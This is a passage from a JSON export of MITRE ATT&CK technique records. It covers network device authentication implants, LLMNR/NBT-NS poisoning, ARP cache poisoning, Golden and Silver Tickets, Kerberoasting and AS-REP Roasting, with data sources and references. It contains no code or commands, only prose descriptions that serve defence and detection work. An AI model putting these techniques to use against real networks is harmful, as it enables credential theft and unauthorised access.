    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a> to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: FireEye - Synful Knock)</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye - Synful Knock",
        "url": "https://www.fireeye.com/blog/threat-research/2015/09/synful_knock_-_acis.html",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd",
    "platform": "network",
    "tid": "T1556.004",
    "technique": "Network Device Authentication",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1601/001\">Patch System Image</a> to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a> may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: FireEye - Synful Knock)</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye - Synful Knock",
        "url": "https://www.fireeye.com/blog/threat-research/2015/09/synful_knock_-_acis.html",
        "description": "Bill Hau, Tony Lee, Josh Homan. (2015, September 15). SYNful Knock - A Cisco router implant - Part I. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e",
    "platform": "windows",
    "tid": "T1557.001",
    "technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "tactic": "credential-access",
    "datasources": "netflow-enclave-netflow|packet-capture|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. <!-- raw HTML omitted --><!-- raw HTML omitted -->Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a> and crack the hashes offline through <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a> to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)<!-- raw HTML omitted --><!-- raw HTML omitted -->Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and <a href=\"https://attack.mitre.org/software/S0174\">Responder</a>. (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia LLMNR",
        "url": "https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution",
        "description": "Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet NetBIOS",
        "url": "https://technet.microsoft.com/library/cc958811.aspx",
        "description": "Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "byt3bl33d3r NTLM Relaying",
        "url": "https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html",
        "description": "Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Secure Ideas SMB Relay",
        "url": "https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html",
        "description": "Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub NBNSpoof",
        "url": "https://github.com/nomex/nbnspoof",
        "description": "Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7 LLMNR Spoofer",
        "url": "https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response",
        "description": "Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Responder",
        "url": "https://github.com/SpiderLabs/Responder",
        "description": "Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Sternsecurity LLMNR-NBTNS",
        "url": "https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning",
        "description": "Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Conveigh",
        "url": "https://github.com/Kevin-Robertson/Conveigh",
        "description": "Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e",
    "platform": "windows",
    "tid": "T1557.001",
    "technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "tactic": "collection",
    "datasources": "netflow-enclave-netflow|packet-capture|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. <!-- raw HTML omitted --><!-- raw HTML omitted -->Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a> and crack the hashes offline through <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a> to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)<!-- raw HTML omitted --><!-- raw HTML omitted -->Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and <a href=\"https://attack.mitre.org/software/S0174\">Responder</a>. (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia LLMNR",
        "url": "https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution",
        "description": "Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet NetBIOS",
        "url": "https://technet.microsoft.com/library/cc958811.aspx",
        "description": "Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "byt3bl33d3r NTLM Relaying",
        "url": "https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html",
        "description": "Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Secure Ideas SMB Relay",
        "url": "https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html",
        "description": "Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub NBNSpoof",
        "url": "https://github.com/nomex/nbnspoof",
        "description": "Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7 LLMNR Spoofer",
        "url": "https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response",
        "description": "Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Responder",
        "url": "https://github.com/SpiderLabs/Responder",
        "description": "Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Sternsecurity LLMNR-NBTNS",
        "url": "https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning",
        "description": "Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Conveigh",
        "url": "https://github.com/Kevin-Robertson/Conveigh",
        "description": "Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
    "platform": "linux|windows|macos",
    "tid": "T1557.002",
    "technique": "ARP Cache Poisoning",
    "tactic": "credential-access",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a> or <a href=\"https://attack.mitre.org/techniques/T1565/002\">Transmitted Data Manipulation</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.<!-- raw HTML omitted --><!-- raw HTML omitted -->The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "RFC826 ARP",
        "url": "https://tools.ietf.org/html/rfc826",
        "description": "Plummer, D. (1982, November). An Ethernet Address Resolution Protocol. Retrieved October 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sans ARP Spoofing Aug 2003",
        "url": "https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411",
        "description": "Siles, R. (2003, August). Real World ARP Spoofing. Retrieved October 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cylance Cleaver",
        "url": "https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf",
        "description": "Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
    "platform": "linux|windows|macos",
    "tid": "T1557.002",
    "technique": "ARP Cache Poisoning",
    "tactic": "collection",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as <a href=\"https://attack.mitre.org/techniques/T1040\">Network Sniffing</a> or <a href=\"https://attack.mitre.org/techniques/T1565/002\">Transmitted Data Manipulation</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.<!-- raw HTML omitted --><!-- raw HTML omitted -->The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "RFC826 ARP",
        "url": "https://tools.ietf.org/html/rfc826",
        "description": "Plummer, D. (1982, November). An Ethernet Address Resolution Protocol. Retrieved October 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sans ARP Spoofing Aug 2003",
        "url": "https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411",
        "description": "Siles, R. (2003, August). Real World ARP Spoofing. Retrieved October 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cylance Cleaver",
        "url": "https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf",
        "description": "Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1",
    "platform": "windows",
    "tid": "T1558.001",
    "technique": "Golden Ticket",
    "tactic": "credential-access",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) <!-- raw HTML omitted --><!-- raw HTML omitted -->Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)<!-- raw HTML omitted --><!-- raw HTML omitted -->The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> and privileged access to a domain controller.</p>\n",
    "technique_references": [
      {
        "source_name": "AdSecurity Kerberos GT Aug 2015",
        "url": "https://adsecurity.org/?p=1640",
        "description": "Metcalf, S. (2015, August 7). Kerberos Golden Tickets are Now More Golden. Retrieved December 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "CERT-EU Golden Ticket Protection",
        "url": "https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf",
        "description": "Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Detecting Forged Tickets",
        "url": "https://adsecurity.org/?p=1515",
        "description": "Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Kerberos and KRBTGT",
        "url": "https://adsecurity.org/?p=483",
        "description": "Sean Metcalf. (2014, November 10). Kerberos & KRBTGT: Active Directory’s Domain Kerberos Service Account. Retrieved January 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Stealthbits Detect PtT 2019",
        "url": "https://blog.stealthbits.com/detect-pass-the-ticket-attacks",
        "description": "Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket Attacks. Retrieved February 27, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Kerberos Golden Ticket",
        "url": "https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285",
        "description": "Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated). Retrieved February 27, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27",
    "platform": "windows",
    "tid": "T1558.002",
    "technique": "Silver Ticket",
    "tactic": "credential-access",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)<!-- raw HTML omitted --><!-- raw HTML omitted -->Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)<!-- raw HTML omitted --><!-- raw HTML omitted -->Password hashes for target services may be obtained using <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a> or <a href=\"https://attack.mitre.org/techniques/T1558/003\">Kerberoasting</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "ADSecurity Silver Tickets",
        "url": "https://adsecurity.org/?p=2011",
        "description": "Sean Metcalf. (2015, November 17). How Attackers Use Kerberos Silver Tickets to Exploit Systems. Retrieved February 27, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity Detecting Forged Tickets",
        "url": "https://adsecurity.org/?p=1515",
        "description": "Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting Attempts to Steal Passwords from Memory",
        "url": "https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea",
        "description": "French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee",
    "platform": "windows",
    "tid": "T1558.003",
    "technique": "Kerberoasting",
    "tactic": "credential-access",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a>.(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) <!-- raw HTML omitted --><!-- raw HTML omitted -->Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline <a href=\"https://attack.mitre.org/techniques/T1110\">Brute Force</a> attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)<!-- raw HTML omitted --><!-- raw HTML omitted -->This same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)<!-- raw HTML omitted --><!-- raw HTML omitted -->Cracked hashes may enable <a href=\"https://attack.mitre.org/tactics/TA0003\">Persistence</a>, <a href=\"https://attack.mitre.org/tactics/TA0004\">Privilege Escalation</a>, and <a href=\"https://attack.mitre.org/tactics/TA0008\">Lateral Movement</a> via access to <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>.(Citation: SANS Attacking Kerberos Nov 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/509.html",
        "description": "none",
        "external_id": "CAPEC-509"
      },
      {
        "source_name": "Empire InvokeKerberoast Oct 2016",
        "url": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1",
        "description": "EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity Cracking Kerberos Dec 2015",
        "url": "https://adsecurity.org/?p=2293",
        "description": "Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detecting Kerberoasting Feb 2018",
        "url": "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/",
        "description": "Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SPN",
        "url": "https://msdn.microsoft.com/library/ms677949.aspx",
        "description": "Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SetSPN",
        "url": "https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx",
        "description": "Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SANS Attacking Kerberos Nov 2014",
        "url": "https://redsiege.com/kerberoast-slides",
        "description": "Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Kerberoast Nov 2016",
        "url": "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/",
        "description": "Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved March 23, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
    "platform": "windows",
    "tid": "T1558.004",
    "technique": "AS-REP Roasting",
    "tactic": "credential-access",
    "datasources": "authentication-logs|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by <a href=\"https://attack.mitre.org/techniques/T1110/002\">Password Cracking</a> Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Preauthentication offers protection against offline <a href=\"https://attack.mitre.org/techniques/T1110/002\">Password Cracking</a>. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->For each account found without preauthentication, an adversary may send an AS-REQ message without the 